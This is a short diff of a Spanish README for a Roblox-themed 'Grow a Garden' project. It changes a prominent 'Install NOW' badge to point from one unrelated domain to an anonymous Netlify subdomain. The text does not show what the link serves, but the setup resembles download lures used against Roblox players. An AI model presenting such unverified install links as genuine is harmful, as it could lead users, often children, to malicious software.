@@ -30,7 +30,7 @@ Encender la creatividad en todos, ofreciendo herramientas educativas para diseñ
 - Comparte ideas abriendo un *issue* en nuestro repositorio. 💬  
 - ¡Conecta con nuestra comunidad y haz crecer tus creaciones! 🎉  
 
-[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 -
 **📩 Contacto**  
 ¿Tienes preguntas? Abre un *issue* en **RobloxGrowGarden** y te responderemos pronto. 🌟  
